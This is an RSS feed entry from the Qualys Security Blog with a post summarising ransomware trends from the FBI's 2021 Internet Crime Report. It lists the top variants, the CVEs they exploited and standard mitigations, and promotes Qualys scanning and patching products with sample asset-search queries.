<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:wfw="http://wellformedweb.org/CommentAPI/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" xmlns:slash="http://purl.org/rss/1.0/modules/slash/" xmlns:georss="http://www.georss.org/georss" xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#">
  <channel>
    <title>Qualys Security Blog</title>
    <atom:link href="https://blog.qualys.com/feed" rel="self" type="application/rss+xml" />
    <link>https://blog.qualys.com</link>
    <description>Expert network security guidance and news</description>
    <lastBuildDate>Thu, 05 May 2022 07:28:07 +0000</lastBuildDate>
    <language>en-US</language>
    <sy:updatePeriod>
	hourly	</sy:updatePeriod>
    <sy:updateFrequency>
	1	</sy:updateFrequency>
    <generator>https://wordpress.org/?v=5.9.2</generator>
    <image>
      <url>https://blog.qualys.com/wp-content/uploads/2017/07/cropped-qualys-150x150.png</url>
      <title>Qualys Security Blog</title>
      <link>https://blog.qualys.com</link>
      <width>32</width>
      <height>32</height>
    </image>
    <item>
      <title>Ransomware Insights from the FBI’s 2021 Internet Crime Report</title>
      <link>https://blog.qualys.com/vulnerabilities-threat-research/2022/05/04/ransomware-insights-from-the-fbis-2021-internet-crime-report</link>
      <comments>https://blog.qualys.com/vulnerabilities-threat-research/2022/05/04/ransomware-insights-from-the-fbis-2021-internet-crime-report#respond</comments>
      <dc:creator><![CDATA[Swapnil Ahirrao]]></dc:creator>
      <pubDate>Wed, 04 May 2022 09:40:56 +0000</pubDate>
      <category><![CDATA[Vulnerabilities and Threat Research]]></category>
      <guid isPermaLink="false">https://blog.qualys.com/?p=29878</guid>
      <description><![CDATA[The FBI has published its annual report on Internet crime. Qualys has analyzed its trends and statistics. In this post, we review our findings, especially with regards to the prevalence of Ransomware, and our recommendations for actions that enterprises should take to mitigate their risk. Every year the U.S. Federal Bureau of Investigation publishes an [&#8230;]]]></description>
      <content:encoded><![CDATA[
<p><em>The FBI has published its annual report on Internet crime. Qualys has analyzed its trends and statistics. In this post, we review our findings, especially with regards to the prevalence of Ransomware, and our recommendations for actions that enterprises should take to mitigate their risk.</em></p>



<p>Every year the U.S. Federal Bureau of Investigation publishes <a href="https://www.ic3.gov/Media/PDF/AnnualReport/2021_IC3Report.pdf">an Internet crime report</a> which summarizes its insights on trends and threats from cybercriminals based on all cybercrimes reported to the FBI by the American public. This annual report provides fascinating insights into the threat landscape, key trends, statistics on types of crimes, the real losses resulting from them, and perhaps most importantly, key insights into how cybercriminals operate so that we can better prepare to guard against them.</p>



<p>For 2021 the FBI reported 5 key threats:</p>



<ol><li>Business Email Compromise (BEC)</li><li>Confidence Fraud / Romance Scams</li><li>Cryptocurrency</li><li>Ransomware</li><li>Tech Support Fraud</li></ol>



<p>Of these threats, only ransomware complaints continue to rise. Ransomware reports increased by almost 51% compared to 2020.</p>



<p>These complaints resulted in a total of $50 million in losses in 2021, compared to $30 million in 2020—a 66% rise in total losses. Ransomware attacks hit more than <a href="https://www.zdnet.com/article/more-than-290-enterprises-hit-by-6-ransomware-groups-in-2021/">290 enterprises in 2021</a>, including major organizations like <a href="https://www.bbc.com/news/business-57178503">Colonial Pipeline</a>, <a href="https://cybersecurityworks.com/blog/ransomware/csw-analysis-accenture-attacked-by-lockbit-2-0-ransomware.html">Accenture</a>, <a href="https://www.bleepingcomputer.com/news/security/computer-giant-acer-hit-by-50-million-ransomware-attack/">Acer</a>, and <a href="https://illinois.touro.edu/news/the-10-biggest-ransomware-attacks-of-2021.php">others</a>.</p>



<span id="more-29878"></span>



<h3>Top Ransomware Attack Vectors of 2021</h3>



<p>Ransomware tactics and techniques are evolving continuously, allowing attackers to make their exploits more sophisticated, resulting in an increasing ransomware threat to organizations globally. Although cybercriminals use a variety of techniques to infect victims with ransomware, the top three initial infection vectors reported remain phishing emails, Remote Desktop Protocol (RDP) exploitation, and software vulnerabilities.</p>



<hr class="wp-block-separator is-style-wide"/>



<p class="has-text-align-center"><strong><strong>Get instant visibility into ransomware exposure with Qualys Cloud Platform</strong></strong></p>



<div class="wp-block-button is-style-fill" style="margin: 0 auto 1em; text-align: center;"><a class="wp-block-button__link has-white-color has-text-color has-background" href="https://www.qualys.com/forms/ransomware/" style="background-color:#ed2e26">Try it Now</a></div>



<hr class="wp-block-separator is-style-wide"/>



<h4>Top Ransomware Variants Exploited Vulnerabilities</h4>



<p>The FBI’s investigations isolated the top 3 ransomware variants that victims suffered: CONTI, LockBit, and REvil/Sodinokibi. The chart below tallies the number of incidents reported for each variant:</p>



<div class="wp-block-image"><figure class="aligncenter size-large is-resized"><img data-attachment-id="29889" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/05/04/ransomware-insights-from-the-fbis-2021-internet-crime-report/attachment/top-ransomware-varaiants" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/05/Top-Ransomware-Varaiants.png" data-orig-size="1229,669" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Top-Ransomware-Varaiants" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/05/Top-Ransomware-Varaiants-300x163.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/05/Top-Ransomware-Varaiants-1070x582.png" src="https://blog.qualys.com/wp-content/uploads/2022/05/Top-Ransomware-Varaiants-1070x582.png" alt="" class="wp-image-29889" width="840" height="456" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Top-Ransomware-Varaiants-1070x582.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Top-Ransomware-Varaiants-300x163.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Top-Ransomware-Varaiants-768x418.png 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Top-Ransomware-Varaiants.png 1229w" sizes="(max-width: 840px) 100vw, 840px" /><figcaption>Source: FBI</figcaption></figure></div>



<p>The report states, &#8220;<em>According to information submitted to the Internet Crime Complaint Center (IC3), CONTI most frequently victimized the Critical Manufacturing, Commercial Facilities, and Food and Agriculture sectors. LockBit most frequently victimized the Government Facilities, Healthcare/Public Health, and Financial Services sectors. REvil/Sodinokibi most frequently victimized Financial Services, Information Technology, and Healthcare/Public Health sectors.</em>&#8220;</p>



<p>The increase in remote work due to the Pandemic made four specific infection vectors more popular. Typical delivery methods for these ransomware variants were:</p>



<ul><li><strong>Spear phishing</strong> – campaigns using tailored emails that contain malicious attachments or malicious links</li><li><strong>Remote Desktop Protocol (RDP)</strong> credentials that are either stolen or weak</li><li><strong>Fake software</strong> promoted via search engine optimization that tempts users to install</li><li><strong>Common vulnerabilities</strong> exploited in external IT assets</li></ul>



<p>Here are a few examples of vulnerabilities exploited in 2021 to launch successful ransomware attacks.</p>



<h5>Conti</h5>



<ul><li>&#8220;PrintNightmare&#8221; vulnerability (<a href="https://media.defense.gov/2021/Sep/22/2002859507/-1/-1/0/CSA_CONTI_RANSOMWARE_20210922.PDF">CVE-2021-34527</a>) in Windows Print spooler service</li><li>&#8220;Zerologon&#8221; vulnerability (<a href="https://media.defense.gov/2021/Sep/22/2002859507/-1/-1/0/CSA_CONTI_RANSOMWARE_20210922.PDF">CVE-2020-1472</a>) in Microsoft Active Directory Domain Controller systems</li></ul>



<h5>LockBit</h5>



<ul><li><a href="https://cybersecurityworks.com/blog/ransomware/csw-analysis-accenture-attacked-by-lockbit-2-0-ransomware.html">CVE-2021-22986</a> is a critical unauthenticated, remote code execution vulnerability in the iControl REST interface, affecting BIG-IP and BIG-IQ products. It was used in the <a href="https://cybersecurityworks.com/blog/ransomware/csw-analysis-accenture-attacked-by-lockbit-2-0-ransomware.html">Accenture attack</a>.</li></ul>



<h5>REvil/Sodinokibi</h5>



<ul><li><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8453">CVE-2018-8453</a> vulnerability is exploited to elevate privileges</li></ul>



<h3>Recommended Ransomware Mitigations</h3>



<h5>Update your operating system and software</h5>



<p>Internet-facing servers should be patched for known vulnerabilities regularly, as well as software processing internet data such as web browsers, browser plugins, and document readers. Software and operating systems should be upgraded regularly to the latest available version. The highest priority should be patching software and operating systems running versions that vendors no longer support.</p>



<h5>Implement user training and phishing exercises to raise awareness about the risks of suspicious links and attachments. Do not click on suspicious links!</h5>



<p>User training has been proven to teach employees to avoid ransomware attacks from phishing and fake software.</p>



<h5>If you use Remote Desktop Protocol (RDP), secure and monitor it</h5>



<p>Limit access to resources over internal networks and monitor RDP access logs. Ensure devices are properly configured, and security features are enabled.</p>



<h5>Make an offline backup of your data</h5>



<p>Regularly run and maintain offline encrypted backups, then test them. Review the backup schedule of your organization and consider the possible backup disruption risk during weekends and holidays.</p>



<h5>Use strong passwords</h5>



<p>Ensure you have a strongly defined password policy, and ensure it is followed across the organization.</p>



<h5>Use multi-factor authentication</h5>



<p>Apply multi-factor authentication (MFA) for all services to the extent possible, particularly for remote access, virtual private networks, and accounts that access critical systems.</p>



<h5>Secure your network(s): implement segmentation, filter traffic, and scan ports</h5>



<p>The most critical communications should be occurring in the most secure and reliable layer. Filter network traffic to prohibit ingress and egress communications with known malicious IP addresses.</p>



<p>Blacklist the malicious URLs/websites. Scan networks for open and listening ports regularly and close those that are unnecessary.</p>



<h3>How Can Qualys Help?</h3>



<h5>Comprehensive Visibility into Critical Ransomware Risk Exposure</h5>



<p>Getting a complete view of your ransomware risk exposure is a big challenge. <a href="https://www.qualys.com/apps/vulnerability-management-detection-response/">Qualys VMDR</a> helps you gain comprehensive visibility into the vulnerabilities, misconfiguration postures, and unauthorized software installed on all assets across your enterprise. Along with that, you gain visibility into available patches and can deploy these patches on the assets impacted. Our dashboard provides a glimpse of critical ransomware risk exposure across your enterprise in one unified console.</p>



<figure class="wp-block-image alignwide size-full"><img data-attachment-id="29890" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/05/04/ransomware-insights-from-the-fbis-2021-internet-crime-report/attachment/ransomware-exposure-dashaboard" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/05/Ransomware-Exposure-Dashaboard.png" data-orig-size="1920,3115" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Ransomware-Exposure-Dashaboard" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/05/Ransomware-Exposure-Dashaboard-300x487.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/05/Ransomware-Exposure-Dashaboard-1070x1736.png" loading="lazy" width="1920" height="3115" src="https://blog.qualys.com/wp-content/uploads/2022/05/Ransomware-Exposure-Dashaboard.png" alt="" class="wp-image-29890" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Ransomware-Exposure-Dashaboard.png 1920w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Ransomware-Exposure-Dashaboard-300x487.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Ransomware-Exposure-Dashaboard-1070x1736.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Ransomware-Exposure-Dashaboard-768x1246.png 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Ransomware-Exposure-Dashaboard-947x1536.png 947w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Ransomware-Exposure-Dashaboard-1262x2048.png 1262w" sizes="(max-width: 1920px) 100vw, 1920px" /></figure>



<h5>Continuous Detection &amp; Prioritization for Ransomware-specific Vulnerabilities</h5>



<p>The first step toward securing your devices from ransomware is to get complete visibility of all assets in your organization. <a href="https://www.qualys.com/apps/cybersecurity-asset-management/">Qualys CSAM</a> provides &#8220;single pane of glass&#8221; visibility of all asset types and helps to eliminate any blind spots. You also get visibility into unmanaged assets</p>



<p>The FBI’s 2021 report clarifies that exploitation of software vulnerabilities remains one of the top three initial infection vectors for ransomware incidents. Most noteworthy is that the top vulnerabilities are exploited using fake software and/or software versions no longer supported by the vendor. CSAM provides visibility into unauthorized and end-of-life software. An unauthorized software list helps you identify fake software that has been installed from unknown sources. </p>



<hr class="wp-block-separator is-style-wide"/>



<p class="has-text-align-center"><strong><strong>Get instant visibility into ransomware exposure with Qualys Cloud Platform</strong></strong></p>



<div class="wp-block-button is-style-fill" style="margin: 0 auto 1em; text-align: center;"><a class="wp-block-button__link has-white-color has-text-color has-background" href="https://www.qualys.com/forms/ransomware/" style="background-color:#ed2e26">Try it Now</a></div>



<hr class="wp-block-separator is-style-wide"/>



<p>Qualys VMDR helps you to monitor and detect ransomware vulnerabilities continuously. You can view the ransomware vulnerabilities detected on assets on which unauthorized software is running using Qualys Query Language (QQL):</p>



<pre class="wp-block-preformatted">Asset dropdown - <code>software:(authorization:Unauthorized)</code><br>Vulnerability dropdown - <code>vulnerabilities.vulnerability.threatIntel.ransomware:true</code></pre>



<figure class="wp-block-image alignwide size-large"><img data-attachment-id="29899" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/05/04/ransomware-insights-from-the-fbis-2021-internet-crime-report/attachment/unauhtorized-software-vulnerabilities-latest" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/05/Unauhtorized-software-vulnerabilities-latest.jpg" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Unauhtorized-software-vulnerabilities-latest" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/05/Unauhtorized-software-vulnerabilities-latest-300x169.jpg" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/05/Unauhtorized-software-vulnerabilities-latest-1070x602.jpg" loading="lazy" width="1070" height="602" src="https://blog.qualys.com/wp-content/uploads/2022/05/Unauhtorized-software-vulnerabilities-latest-1070x602.jpg" alt="" class="wp-image-29899" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Unauhtorized-software-vulnerabilities-latest-1070x602.jpg 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Unauhtorized-software-vulnerabilities-latest-300x169.jpg 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Unauhtorized-software-vulnerabilities-latest-768x432.jpg 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Unauhtorized-software-vulnerabilities-latest-1536x864.jpg 1536w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Unauhtorized-software-vulnerabilities-latest.jpg 1920w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<p>You can also identify all of the assets on which 2021’s top three ransomware variants are detected: CONTI, LockBit, and REvil/Sodinokibi.</p>



<p>QQL details are:</p>



<pre class="wp-block-preformatted"><code>(vulnerabilities.vulnerability.threatIntel.ransomware:true)</code> and (vulnerabilities.vulnerability.ransomware.name:[<code>REvil/Sodinokibi</code>, <code>Ryuk/Conti</code>, <code>lockBit</code>])</pre>



<figure class="wp-block-image alignwide size-large"><img data-attachment-id="29901" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/05/04/ransomware-insights-from-the-fbis-2021-internet-crime-report/attachment/search-top-ransomware-vuln_new_latest" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/05/Search-Top-Ransomware-Vuln_new_Latest.png" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Search-Top-Ransomware-Vuln_new_Latest" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/05/Search-Top-Ransomware-Vuln_new_Latest-300x169.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/05/Search-Top-Ransomware-Vuln_new_Latest-1070x602.png" loading="lazy" width="1070" height="602" src="https://blog.qualys.com/wp-content/uploads/2022/05/Search-Top-Ransomware-Vuln_new_Latest-1070x602.png" alt="" class="wp-image-29901" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Search-Top-Ransomware-Vuln_new_Latest-1070x602.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Search-Top-Ransomware-Vuln_new_Latest-300x169.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Search-Top-Ransomware-Vuln_new_Latest-768x432.png 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Search-Top-Ransomware-Vuln_new_Latest-1536x864.png 1536w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Search-Top-Ransomware-Vuln_new_Latest.png 1920w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<p>Using Qualys VMDR prioritization, ransomware vulnerabilities can be easily prioritized by using &#8220;Ransomware&#8221; in the Real-Time Threat Indicator (RTI) filter section:</p>



<figure class="wp-block-image alignwide size-large"><img data-attachment-id="29902" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/05/04/ransomware-insights-from-the-fbis-2021-internet-crime-report/attachment/ransomware-prioritization-latest" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/05/Ransomware-Prioritization-Latest.jpg" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Ransomware-Prioritization-Latest" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/05/Ransomware-Prioritization-Latest-300x169.jpg" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/05/Ransomware-Prioritization-Latest-1070x602.jpg" loading="lazy" width="1070" height="602" src="https://blog.qualys.com/wp-content/uploads/2022/05/Ransomware-Prioritization-Latest-1070x602.jpg" alt="" class="wp-image-29902" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Ransomware-Prioritization-Latest-1070x602.jpg 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Ransomware-Prioritization-Latest-300x169.jpg 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Ransomware-Prioritization-Latest-768x432.jpg 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Ransomware-Prioritization-Latest-1536x864.jpg 1536w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Ransomware-Prioritization-Latest.jpg 1920w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<p>Along with vulnerabilities, Qualys VMDR also keeps you up to date on evolving threats via its &#8216;Live Threat Feed&#8217;, which can help with prioritization. The &#8220;Live Threat Feed&#8221; provides visibility of high, medium, and low-rate feeds along with a count of the impacted assets. Click on the count to view more details about the impacted assets.</p>



<p>In the &#8220;Threat Feed&#8221; tab, search using <code>contents:ransomware</code> to find all threats associated with ransomware.</p>



<figure class="wp-block-image alignfull size-full"><img data-attachment-id="29895" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/05/04/ransomware-insights-from-the-fbis-2021-internet-crime-report/attachment/threat_feed" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/05/Threat_feed.png" data-orig-size="646,1071" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Threat_feed" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/05/Threat_feed-300x497.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/05/Threat_feed.png" loading="lazy" width="646" height="1071" src="https://blog.qualys.com/wp-content/uploads/2022/05/Threat_feed.png" alt="" class="wp-image-29895" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Threat_feed.png 646w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Threat_feed-300x497.png 300w" sizes="(max-width: 646px) 100vw, 646px" /></figure>



<h5>Discover and Mitigate Ransomware Misconfigurations</h5>



<p>Misconfigurations often play a vital role in ransomware attacks, as they might help the attacker gain access to your assets. <a href="https://www.qualys.com/apps/policy-compliance/">Qualys Policy Compliance</a> provides comprehensive visibility into ransomware misconfigurations. The Ransomware Best Practices policy contains the critical controls mapped to MITRE ATT&amp;CK mitigations as well as tactics recommended by <a href="https://us-cert.cisa.gov/ncas/alerts/aa21-131a">CISA</a> and best practices published by <a href="https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/wp-ransomware-protection-and-containment-strategies.pdf">Fireye Mandiant</a>. These mitigations are effective across top techniques and can potentially reduce the risk of ransomware attacks. These critical controls can limit attackers&#8217; initial access and lateral movement around your network.</p>



<p>Apply this ransomware policy to all assets across your enterprise to ensure that all assets are correctly configured. You can automate the configurations assessment and apply this to the golden images to confirm your security baselines before distribution.</p>



<p>Qualys Policy Compliance helps you to configure the recommended mitigations for the password, RDP, network security policy, and software update by applying the ransomware policies on the impacted assets.</p>



<figure class="wp-block-image alignwide size-full"><img data-attachment-id="29896" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/05/04/ransomware-insights-from-the-fbis-2021-internet-crime-report/attachment/policy-compliance-3" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/05/Policy-Compliance.png" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Policy-Compliance" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/05/Policy-Compliance-300x169.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/05/Policy-Compliance-1070x602.png" loading="lazy" width="1920" height="1080" src="https://blog.qualys.com/wp-content/uploads/2022/05/Policy-Compliance.png" alt="" class="wp-image-29896" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Policy-Compliance.png 1920w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Policy-Compliance-300x169.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Policy-Compliance-1070x602.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Policy-Compliance-768x432.png 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Policy-Compliance-1536x864.png 1536w" sizes="(max-width: 1920px) 100vw, 1920px" /></figure>



<h5>Automated Effortless Patching for Ransomware Vulnerabilities</h5>



<p>Qualys <a href="https://blog.qualys.com/product-tech/2021/09/14/optimize-vulnerability-remediation-with-zero-touch-patch">zero-touch patching</a> helps you automatically patch new ransomware-related vulnerabilities that are being actively exploited in attacks. It is faster and more accurate than manual patching and helps to patch up to 97% of ransomware vulnerabilities.</p>



<p><a href="https://www.qualys.com/apps/patch-management/">Qualys Patch Management</a> provides a more efficient and effective way to proactively patch detected ransomware vulnerabilities. Qualys VMDR helps prioritize the ransomware vulnerabilities that Qualys PM executes. This tight integration enables you to initiate patch jobs directly from the Prioritization tab. Quick patching of critical ransomware vulnerabilities reduces ransomware risk. Auto-correlation of patches against the ransomware vulnerabilities detected reduces your overall remediation time and makes the IT team’s job easier.</p>



<figure class="wp-block-image alignwide size-large"><img data-attachment-id="29904" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/05/04/ransomware-insights-from-the-fbis-2021-internet-crime-report/attachment/patch-management_latest" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/05/Patch-Management_Latest.jpg" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Patch-Management_Latest" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/05/Patch-Management_Latest-300x169.jpg" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/05/Patch-Management_Latest-1070x602.jpg" loading="lazy" width="1070" height="602" src="https://blog.qualys.com/wp-content/uploads/2022/05/Patch-Management_Latest-1070x602.jpg" alt="" class="wp-image-29904" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Patch-Management_Latest-1070x602.jpg 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Patch-Management_Latest-300x169.jpg 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Patch-Management_Latest-768x432.jpg 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Patch-Management_Latest-1536x864.jpg 1536w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/05/Patch-Management_Latest.jpg 1920w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<p>Ready to hear more? For more details, <a href="https://vimeo.com/617379785">watch this video</a> on our Ransomware offering. Then try out our <a href="https://www.qualys.com/forms/ransomware/">Ransomware Risk Assessment &amp; Remediation Service</a> at no cost for 60 days. Uncover your organization’s level of exposure and create a prescribed patch plan to reduce your ransomware risk.</p>



<hr class="wp-block-separator is-style-wide"/>



<p class="has-text-align-center"><strong><strong>Get instant visibility into ransomware exposure with Qualys Cloud Platform</strong></strong></p>



